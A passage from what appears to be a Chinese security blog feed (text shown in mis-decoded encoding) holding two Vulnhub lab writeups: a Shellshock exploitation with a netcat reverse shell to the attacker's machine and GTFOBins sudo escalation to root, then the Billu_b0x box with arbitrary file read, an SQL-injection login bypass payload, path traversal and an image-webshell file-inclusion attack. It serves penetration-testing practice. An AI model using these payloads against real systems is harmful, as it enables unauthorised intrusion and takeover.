<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æ‰«æå‡ºäº†<code>admin_login.php</code>ã€‚è¿™å¾ˆæ˜æ˜¾åº”è¯¥æ˜¯åå°ç™»å½•åœ°å€ã€‚å°è¯•åˆšåˆšè·å¾—çš„é»˜è®¤è´¦å·å’Œå¯†ç è¿›è¡Œç™»é™†ã€‚å‘ç°ç›´æ¥ç™»å½•æˆåŠŸäº†ï¼</p>
<p>åœ¨ç½‘ç«™è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå‘ç°è¯¥ç½‘ç«™å­˜åœ¨ç€ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ä»åå°çœ‹åˆ°æ‰€æœ‰äººçš„è´¦å·å’Œå¯†ç ï¼Œè¿˜å¯ä»¥åˆ©ç”¨è¿™äº›å¯†ç è¿›è¡Œè½¬è´¦ï¼Œå› ä¸ºè¯¥ç½‘ç«™æ²¡æœ‰ä¸¥æ ¼é™åˆ¶ç™»é™†å¯†ç å’Œæ”¯ä»˜å¯†ç ä¸èƒ½ä¸€è‡´ï¼Œæ‰€ä»¥ç°å­˜çš„è´¦å·çš„ç™»å½•å¯†ç å’Œæ”¯ä»˜å¯†ç ä¸€è‡´ï¼Œå› æ­¤å¯ä»¥ç›—ç”¨è¿™äº›è´¦å·å¯†ç ï¼Œç„¶åç™»å½•ï¼Œä¹‹åç»™è‡ªå·±çš„è´¦å·è½¬è´¦å³å¯ã€‚è™½ç„¶ä¸šåŠ¡é€»è¾‘æ¼æ´åœ¨æ‰“é¶è¿‡ç¨‹ä¸­æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯åœ¨ç°å®ç”Ÿæ´»ä¸­æ˜¯ç›´æ¥é€ æˆç»æµæŸå¤±çš„ã€‚</p>
<h2 id="ç ´å£³æ¼æ´get-shell">ç ´å£³æ¼æ´get shell</h2>
<p>ä¹‹å‰åœ¨æºç ä¸­çœ‹åˆ°äº†<code>&lt;!-- cgi-bin --&gt;</code>è¿™å…¶å®å°±æ˜¯ä½¿ç”¨äº†CGIæŠ€æœ¯ï¼Œä½¿ç”¨è¯¥æŠ€æœ¯å¯èƒ½å­˜åœ¨ç€ä¸€ç§æ¼æ´ï¼Œé‚£å°±æ˜¯<strong>ç ´å£³æ¼æ´</strong>ï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13/cgi-bin/ -f -e cgi,sh</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152211.png" /></p>
<p>500ï¼šè¡¨ç¤ºæˆ‘ä»¬æäº¤çš„å‚æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿäº†é”™è¯¯ï¼Œä½†æ˜¯ä¸ä»£è¡¨æˆ‘ä»¬è®¿é—®çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåè€Œè¯æ˜æ–‡ä»¶åº”è¯¥æ˜¯å­˜åœ¨çš„ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 10.0.2.13</span><br><span class="line"><span class="comment"># http-shellshock ä¸“é—¨ç”¨æ¥æµ‹è¯•æ˜¯å¦å­˜åœ¨ç ´å£³æ¼æ´</span></span><br><span class="line"><span class="comment"># å¦‚æœæœ€åçš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œè¯´æ˜å­˜åœ¨æ¼æ´</span></span><br><span class="line"><span class="comment"># uri=/cgi-bin/shell.sh è¦æ£€æµ‹çš„æ–‡ä»¶è·¯å¾„</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152316.png" /></p>
<p>å‘ç°ç¡®å®å­˜åœ¨ç ´å£³æ¼æ´ã€‚ä¹Ÿå¯ä»¥å¯¹<code>backup.cgi</code>è¿›è¡Œæµ‹è¯•ä¸€ä¸‹ã€‚ä¸‹é¢çš„ä»£ç å°±åˆ©ç”¨ï¼ˆ<code>-A</code>ç­‰ä»·äº<code>-H</code>ï¼Œéƒ½æ˜¯æŒ‡å®š<code>user-agent</code>ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; /bin/bash -c &#x27;which nc&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br><span class="line"><span class="comment"># å¦‚æœå­˜åœ¨ncï¼Œå°±å¯ä»¥åˆ©ç”¨ncåå¼¹ã€‚å…ˆç”¨-eçš„å°è¯•ä¸€ä¸‹ï¼Œå¦‚æœä¸å¯ä»¥å†ç”¨ncä¸²è”</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412172426.png" /></p>
<p>æ­¤æ—¶èƒ½å¤Ÿç™¾åˆ†ä¹‹ç™¾ç¡®å®šå­˜åœ¨ç ´å£³æ¼æ´ã€‚æ¥ç€åå¼¹shell <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;nc -e /bin/bash 10.0.2.4 4444&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412154821.png" /></p>
<p>åå¼¹æˆåŠŸï¼</p>
<h2 id="æƒé™æå‡">æƒé™æå‡</h2>
<p>é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹sudoé…ç½®<code>sudo -l</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155743.png" /></p>
<p>å‘ç°äº†å¥‡æ€ªçš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å°è¯•æ‰§è¡Œä¸€ä¸‹ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u thor /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure></p>
<p>ç„¶åè¦æ±‚æˆ‘ä»¬è¾“å…¥ï¼Œæˆ‘ä»¬è¾“å…¥å‡ æ¡ç³»ç»Ÿå‘½ä»¤çœ‹ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155919.png" /></p>
<p>çŒœæµ‹ï¼šç¬¬ä¸€ä¸ªè¾“å…¥ç‚¹ï¼Œæ— è®ºæˆ‘ä»¬è¾“å…¥ä»€ä¹ˆéƒ½ä¼šè¢«è¿”å›ï¼›è€Œç¬¬äºŒä¸ªè¾“å…¥ç‚¹åˆ™ä¼šæ‰§è¡Œå‘½ä»¤ã€‚åˆšåˆšçš„<code>id</code>å¯ä»¥çœ‹å‡ºï¼Œè¯¥ç¨‹åºçš„æƒé™æ˜¯<code>thor</code>ï¼Œå¦‚æœè¯¥ç¨‹åºæ‰§è¡Œ<code>bash</code>åˆ™ä¼šå¾—åˆ°<code>thor</code>æƒé™çš„bashã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160049.png" /></p>
<p>æœä¸å…¶ç„¶ï¼ŒæˆåŠŸå¾—åˆ°<code>thor</code>çš„æƒé™ã€‚ç¬¬ä¸€ä¸ªflagåœ¨<code>/home/thor/user.txt</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160245.png" /></p>
<p>ç„¶åéœ€è¦æƒ³åŠæ³•ææƒåˆ°rootï¼Œå†æ¬¡æŸ¥çœ‹sudoé…ç½®<code>sudo -l</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160315.png" /></p>
<p>è¿™é‡Œæ¶‰åŠåˆ°<strong>GTFOBinsææƒï¼šé’ˆå¯¹ç›®æ ‡ç³»ç»Ÿè‡ªå¸¦çš„åº”ç”¨ç¨‹åºé…ç½®ä¸å½“å¯¼è‡´ææƒ</strong>ï¼Œå‚è€ƒé“¾æ¥ï¼š<a href="https://gtfobins.github.io">gtfobins</a></p>
<p>ç½‘ç«™ä¸­æåˆ°</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160423.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160429.png" /></p>
<p>å› ä¸ºæˆ‘ä»¬éœ€è¦ææƒåˆ°rootï¼Œæ‰€ä»¥ä½¿ç”¨åè€…ä¸­çš„<code>Shell</code>çš„å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯å¦‚ä¸‹å‘½ä»¤ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160607.png" /></p>
<p>æˆåŠŸææƒåˆ°rootï¼æ¥ä¸‹æ¥è·å–ç¬¬äºŒä¸ªflag<code>/root/root.txt</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160550.png" /></p>
<p>å…¶å®ä¹Ÿå¯ä»¥é€šè¿‡<code>/usr/bin/cat</code>ç›´æ¥è¯»å–flagã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160915.png" /></p>
<p>æœ¬å°é¶æœºåˆ°æ­¤ç»“æŸï¼</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>è¯¥é¶æœºçš„éš¾åº¦ä¸»è¦åœ¨äº<strong>ç ´å£³æ¼æ´</strong>çš„å‘ç°ä»¥åŠ <strong>GTFOBinsæ¼æ´</strong>åˆ©ç”¨ã€‚ç»ƒä¹ è¿™ä¹ˆå¤šä¸ªé¶æœºä»¥æ¥ç¬¬ä¸€æ¬¡ç¢°åˆ°è¿™æ ·çš„æ¼æ´ä»¥åŠåˆ©ç”¨æ–¹å¼ã€‚</p>
<p>è¿˜æœ‰ä¸€ç‚¹ï¼Œå°±æ˜¯å¦‚æœå‘ç°ç›®æ ‡ç«™ç‚¹ä½¿ç”¨çš„æ˜¯å¼€æºçš„æ¡†æ¶ï¼Œå¯ä»¥å°è¯•ä»¥ä¸‹é»˜è®¤çš„è´¦å·å’Œå¯†ç ã€‚</p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>ç ´å£³æ¼æ´</tag>
        <tag>å¼€æºæºç æ³„éœ²</tag>
        <tag>GTFOBinsææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>11 Vulnhub Billu_b0x Writeup</title>
    <url>/2022/04/14/11%20Vulnhub%20Billu_b0x%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ä¸ºä¸­ç­‰ï¼Œä¸è¿‡å­˜åœ¨å¤šç§æ€è·¯ã€‚è‚¯å®šè¿˜æœ‰ä¸€äº›æˆ‘æ²¡æœ‰è®°å½•åˆ°ã€‚è¯¥é¶æœºçš„æ¼æ´éƒ½æ¯”è¾ƒå¸¸è§„ï¼Œä½†æ˜¯ç»„åˆèµ·æ¥å°±æœ‰äº†éå¸¸å¥½çš„è¡¨ç°ï¼</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/billu-b0x,188/">Billu_b0x</a></li>
</ul>
<p>éš¾åº¦ï¼š</p>
<ul>
<li>ä¸­ï¼ˆå¤šç§æ”»å‡»è·¯çº¿ï¼‰</li>
</ul>
<p>ç›®æ ‡ï¼š</p>
<ul>
<li>å–å¾—rootæƒé™</li>
</ul>
<p>æ¶‰åŠæ”»å‡»æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li>Webä¿¡æ¯æ”¶é›†ï¼ˆå…³æ³¨é…ç½®ä¿¡æ¯ï¼‰</li>
<li>SQLæ³¨å…¥ï¼ˆsqlmapæ— æ³•å¾—åˆ°ç»“æœï¼‰</li>
<li>æ–‡ä»¶åŒ…å«æ¼æ´</li>
<li>æ–‡ä»¶ä¸Šä¼ æ¼æ´</li>
<li>ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</li>
<li>æºç å®¡è®¡</li>
<li>å†…æ ¸æ¼æ´ææƒ</li>
</ul>
<p>å¯¼å…¥è™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œæ³¨æ„çº¢æ¡†ä¸­çš„é€‰æ‹©ï¼ï¼ï¼å¦åˆ™ä¼šæ‰«ä¸åˆ°IPã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413121446.png" /></p>
<h1 id="æ¸—é€-1">æ¸—é€-1</h1>
<h2 id="ä¸»æœºå‘ç°ç«¯å£æ‰«æç«¯å£æœåŠ¡å‘ç°">ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.15</span><br><span class="line">sudo nmap -p22,80 -sV 10.0.2.15</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414190943.png" /></p>
<ul>
<li>22ç«¯å£çš„æœåŠ¡ä¸ºssh</li>
<li>80ç«¯å£çš„æœåŠ¡ä¸ºhttpï¼Œapache2.2.22</li>
<li>é¶æœºæ“ä½œç³»ç»Ÿä¸ºUbuntu</li>
</ul>
<h2 id="è®¿é—®httpæœåŠ¡">è®¿é—®httpæœåŠ¡</h2>
<p>ç›´æ¥è®¿é—®80ç«¯å£ï¼Œè¯¥ç•Œé¢å­˜åœ¨SQLæ³¨å…¥ï¼Œä½†æ˜¯å¾ˆéš¾ï¼ï¼ï¼å¸¸è§„çš„æ–¹æ³•æ²¡æœ‰ä»€ä¹ˆä½œç”¨ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡burpçˆ†ç ´ï¼Œéœ€è¦çš„å­—å…¸æ¯”è¾ƒå¤§ï¼Œæœ€å¥½æœ‰proç‰ˆæœ¬è·‘ã€‚ï¼ˆæˆ‘åæ­£æ²¡åšå‡ºæ¥ï¼‰</p>
<p>æ¥ä¸‹æ¥å¸¸è§„çš„è¿›è¡Œä¸€ä¸‹è·¯å¾„æ‰«æï¼Œå‘ç°äº†è®¸å¤šä¸œè¥¿ï¼ï¼ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414192633.png" /></p>
<p>é‡Œé¢æœ‰éå¸¸å¤šçš„æ¼æ´ï¼ï¼ï¼è¿˜æœ‰è®¸å¤šå…³é”®ä¿¡æ¯ï¼Œè¿™é‡Œå…ˆå±•ç¤ºç¬¬ä¸€ç§åˆ©ç”¨æ–¹å¼æ‰€ç”¨åˆ°çš„ï¼Œå‰©ä¸‹çš„ä¼šåœ¨å…¶ä»–æ”»å‡»è·¯çº¿ä¸­æåˆ°ã€‚</p>
<p>å…³æ³¨<code>test.php</code>è¿™ä¸ªæ–‡ä»¶ï¼ˆurlä¸­è¾“å…¥<code>test</code>ä¼šè¢«å®šä½åˆ°<code>test.php</code>ï¼‰ï¼Œå‘ç°ä¸€å¥æç¤º <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;file&#x27; parameter is empty. Please provide file path in &#x27;file&#x27; parameter</span><br></pre></td></tr></table></figure></p>
<p>ç»è¿‡æµ‹è¯•å‘ç°éœ€è¦ç”¨POSTæ–¹å¼æäº¤å‚æ•°fileï¼Œç„¶åå°±ä¼šå‘ç°ï¼Œè¿™é‡Œå­˜åœ¨<strong>ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</strong>ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414192915.png" /></p>
<p>æˆåŠŸå¾—åˆ°<code>index.php</code>çš„æºç ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å¾—åˆ°å…¶ä»–çš„æºç æˆ–è€…å…¶ä»–æ–‡ä»¶çš„å†…å®¹ï¼ï¼ï¼</p>
<h2 id="sqlæ³¨å…¥">SQLæ³¨å…¥</h2>
<h3 id="çˆ†ç ´">çˆ†ç ´</h3>
<p>æ”»å‡»æ–¹å¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414191708.png" /></p>
<p>ç¬¬ä¸€ä¸ªå­—å…¸é€‰æ‹©ï¼š<code>/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414191738.png" /></p>
<p>ç¬¬äºŒä¸ªå­—å…¸é€‰æ‹©ï¼šï¼ˆåªæœ‰proç‰ˆæ‰æœ‰ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414191859.png" /></p>
<p>ç„¶åå¯ä»¥è·‘å‡ºæ¥ï¼</p>
<h3 id="ç»•è¿‡å•å¼•å·è¿‡æ»¤">ç»•è¿‡å•å¼•å·è¿‡æ»¤</h3>
<p>é€šè¿‡<code>test.php</code>çš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œå¾—åˆ°äº†<code>index.php</code>çš„æºç ï¼Œç›´æ¥ç»™å‡ºå…³é”®çš„æºç ä¿¡æ¯ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line"><span class="variable">$pass</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line"><span class="variable">$run</span>=<span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>é¦–å…ˆå…³æ³¨ä¸€ä¸‹æŸ¥è¯¢é‚£å¥ä»£ç ï¼Œç°åœ¨è¿™æ ·å­æ˜æ˜¾å¤ªå¤æ‚äº†ï¼Œæˆ‘ä»¬æŠŠå®ƒç®€åŒ–ä¸€ä¸‹ã€‚é¦–å…ˆï¼Œå› ä¸º<code>$run</code>æœ€å¤–é¢ä½¿ç”¨çš„æ˜¯å•å¼•å·ï¼Œæ‰€ä»¥åœ¨å†…éƒ¨çš„å•å¼•å·å‰é¢éœ€è¦åŠ ä¸Šè½¬ä¹‰å­—ç¬¦ã€‚å› æ­¤çœŸæ­£çš„æŸ¥è¯¢è¯­å¥å®é™…å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> auth where  pass=<span class="string">&#x27;[å¯†ç ]&#x27;</span> <span class="keyword">and</span> uname=<span class="string">&#x27;[è´¦å·]&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>ä¸ºäº†æ–¹ä¾¿è§‚çœ‹ï¼Œæˆ‘å°†æˆ‘ä»¬è¾“å…¥çš„éƒ¨åˆ†ç”¨<code>[]</code>åŒ…æ‹¬èµ·æ¥äº†ï¼Œå¹¶ä¸”<code>$run</code>å’Œå¤´å°¾çš„å•å¼•å·æˆ‘éƒ½å»æ‰äº†ã€‚</p>
<p>ç›´æ¥ç»™å‡ºä¸€ä¸ªpayloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">un=or 1=1#&amp;ps=\</span><br></pre></td></tr></table></figure></p>
<p>å°†ä¸Šè¿°payloadå¸¦å…¥æŸ¥è¯¢è¯­å¥ä¸­ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> auth where pass=<span class="string">&#x27;\&#x27; and uname=&#x27;</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>åˆ†æï¼Œå› ä¸ºæˆ‘ä»¬è¾“å…¥äº†ä¸€ä¸ª<code>\</code>ï¼Œä½¿å¾—ä¸Šé¢è¯­å¥ä¸­çš„ç¬¬äºŒä¸ªå•å¼•å·å¤±å»äº†ä¸å‰é¢å•å¼•å·é—­åˆçš„åŠŸèƒ½ï¼Œä»…ä»…ä½œä¸ºä¸€ä¸ªå•å¼•å·è¢«æŸ¥è¯¢ã€‚é‚£ä¹ˆç¬¬ä¸€ä¸ªå•å¼•å·å°±ä¼šå’Œç¬¬ä¸‰ä¸ªå•å¼•å·é—­åˆï¼Œä½¿å¾—<code>or 1=1</code>é€ƒé€¸ï¼Œç„¶å<code>#</code>åˆæŠŠæœ€åçš„å•å¼•å·æ³¨é‡Šæ‰äº†ã€‚å› æ­¤ï¼Œæ­¤æ—¶æŸ¥è¯¢çš„ä¿¡æ¯åº”è¯¥å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. pass = \&#x27; and uname=</span><br><span class="line">2. uname æ²¡äº†</span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤ï¼Œ<code>where</code>åé¢çš„ä¸¤ä¸ªåˆ¤æ–­æ¡ä»¶å˜æˆäº†ä¸€ä¸ªï¼Œå¹¶ä¸”å¤šäº†ä¸€å¥<code>or 1=1</code>ã€‚å› ä¸ºåè€…ä¸º1ï¼Œå¹¶ä¸”æ˜¯<code>or</code>ï¼Œæ‰€ä»¥è¿™å¥æŸ¥è¯¢è¯­å¥ä¸€å®šä¸ºçœŸï¼Œç›´æ¥ç™»é™†æˆåŠŸï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414192522.png" /></p>
<p>ç›´æ¥é¡µé¢è¾“å…¥å¯¹åº”çš„ä¿¡æ¯å³å¯æˆåŠŸç™»å½•ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414193115.png" /></p>
<h2 id="æ–‡ä»¶ä¸Šä¼ å’Œæ–‡ä»¶åŒ…å«é…åˆå›¾ç‰‡åå¼¹shell">æ–‡ä»¶ä¸Šä¼ å’Œæ–‡ä»¶åŒ…å«é…åˆâ€”â€”å›¾ç‰‡ğŸåå¼¹shell</h2>
<p>å‘ç°<code>add users</code>ä¸‹é¢å­˜åœ¨ç€æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œç»è¿‡æµ‹è¯•å‘ç°åªèƒ½å¤Ÿä¸Šä¼ åç¼€ã€<code>content-type</code>ã€<code>MIME</code>éƒ½ä¸ºå›¾ç‰‡çš„æ–‡ä»¶ï¼Œç®€å•æ¥è¯´å°±æ˜¯åªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œä½†æ˜¯å›¾ç‰‡çš„å†…å®¹å¯ä»¥æ˜¯ä¸€å¥è¯ã€‚ï¼ˆä¹Ÿå¯ä»¥é€šè¿‡<code>test.php</code>è¯»å–<code>panel.php</code>çš„æºç ï¼‰</p>
<p>æ¥ä¸‹æ¥æƒ³ç€æ—¢ç„¶ä¸èƒ½ä¸Šä¼ <code>php</code>æ–‡ä»¶ï¼Œé‚£ä¹ˆæ˜¯å¦å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Ÿå¦‚æœæœ‰çš„è¯å°±å¯ä»¥ä¸¤è€…é…åˆå®ç°å›¾ç‰‡ğŸã€‚</p>
<blockquote>
<p>å›¾ç‰‡ğŸï¼šåç¼€ã€MIMEå’ŒContent-Typeéƒ½æ˜¯å›¾ç‰‡çš„æ ¼å¼ï¼Œåªæ˜¯å›¾ç‰‡çš„å†…å®¹æ˜¯ä¸€å¥è¯æœ¨é©¬ã€‚æ­¤æ—¶å¦‚æœå›¾ç‰‡çš„å†…å®¹èƒ½å¤Ÿè¢«è§£æå¹¶ä¸”å½“ä½œä»£ç æ‰§è¡Œï¼Œå°±å¯ä»¥æ‰§è¡Œæœ¨é©¬ï¼æ­¤æ—¶æœ¨é©¬çš„å†…å®¹ä¸è¦ä¸ºPOSTï¼Œæœ€å¥½ä¸ºGETï¼Œç„¶åç›´æ¥åå¼¹shellæˆ–è€…å†™ä¸€å¥è¯åˆ°phpä¸­ï¼Œç„¶åä¸Šçº¿èšå‰‘ã€‚ åŸå› ï¼šè¯¥é¶æœºä¸­çš„åŠ è½½å›¾ç‰‡é©¬æ˜¯POSTä¸­çš„å‚æ•°loadæä¾›çš„ï¼Œæ­¤æ—¶å¦‚æœéœ€è¦ä¸Šçº¿èšå‰‘ï¼Œä¹Ÿéœ€è¦POSTæäº¤å†…å®¹ï¼Œå½“å‰æƒ…å†µä¸‹æ— æ³•å®ç°ã€‚å¦‚æœåŠ è½½å›¾ç‰‡æ˜¯GETå®Œæˆçš„ï¼Œé‚£ä¹ˆå¯ä»¥åŒæ—¶POSTæäº¤å‘½ä»¤ï¼Œæ­¤æ—¶æ‰å¯ä»¥ä¸Šçº¿èšå‰‘ã€‚<a href="https://hdfzzf.icu/2022/04/16/NPUCTF2020%20ReadlezPHP/">NPUCTF2020 Readl</a>ä¸­æœ‰å°è¯•ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬æŠ“å–ä¸€ä¸‹æ•°æ®åŒ…ï¼Œå‘ç°å½“æˆ‘ä»¬åˆ‡æ¢åˆ°<code>add users</code>æˆ–è€…<code>show users</code>æ—¶</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414195046.png" /></p>
<p>è€Œåˆšåˆšè·¯å¾„æ‰«æå¾—åˆ°ä¸€ä¸ª<code>add</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414195202.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414195219.png" /></p>
<p>å‘ç°ä¸¤è€…éå¸¸ç±»ä¼¼ï¼Œå› æ­¤å¯ä»¥çŒœæµ‹é€šè¿‡<code>load=filename</code>å¯ä»¥åŒ…å«å…¶ä»–æ–‡ä»¶ã€‚å°è¯•ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414195344.png" /></p>
<p>ç¡®è®¤å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¦‚æœï¼š/etc/passwd æ²¡æœ‰æ•ˆæœï¼Œå¯ä»¥å°è¯•ä»¥ä¸‹ä¸‹é¢çš„payloadï¼Œç»•è¿‡æ— æ³•ä»å½“å‰ç›®å½•è®¿é—®çš„é™åˆ¶</span><br><span class="line">../../../../../../../../../etc/payload</span><br></pre></td></tr></table></figure>
<p>æœ‰å¤šç§æ–¹å¼åˆ©ç”¨å›¾ç‰‡ğŸï¼š</p>
<ul>
<li>å†™å…¥å‘½ä»¤æ‰§è¡Œä»£ç ï¼Œç„¶åæ‰§è¡Œå¯¹åº”çš„å‘½ä»¤ï¼›ï¼ˆæ­¤æ—¶ä¹Ÿå¯ä»¥è¾“å…¥å¯¹åº”å‘½ä»¤ï¼Œæ‰§è¡Œåé¢ä¸¤è€…ï¼‰</li>
<li>å¾€æœ‰å†™å…¥æƒé™çš„çš„ç›®å½•æˆ–æ–‡ä»¶å†™å…¥ä¸€å¥è¯ï¼Œç„¶åä¸Šçº¿èšå‰‘</li>
<li>ç›´æ¥å†™å…¥åå¼¹shellçš„å‘½ä»¤ï¼›</li>
</ul>
<h3 id="ç¬¬ä¸€ç§ç¬¬äºŒç§">ç¬¬ä¸€ç§+ç¬¬äºŒç§</h3>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201033.png" /></p>
<p>å¿…é¡»ä½¿ç”¨<code>system</code>ï¼Œ<code>eval</code>æ²¡ç”¨ï¼ä¸çŸ¥é“åŸå› ï¼</p>
<p>ç„¶åä¸Šä¼ ï¼Œåˆ°<code>show users</code>ç•Œé¢å°±å¯ä»¥æŸ¥çœ‹å¯¹åº”çš„å›¾ç‰‡åœ°å€</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414200103.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.15/uploaded_images/1.gif</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘½ä»¤æ‰§è¡Œï¼š</span><br><span class="line">1. </span><br><span class="line">load=uploaded_iamges/1.gif?cmd=ls</span><br><span class="line">ç»å°è¯•ï¼Œä¸è¡Œ</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">å¯ä»¥åœ¨panel.php?cmd=ls -l</span><br><span class="line">load=uploaded_iamges/1.gif</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„<code>ls -l</code>éœ€è¦urlç¼–ç ï¼Œå¦åˆ™æ— æ³•æ‰§è¡Œï¼</p>
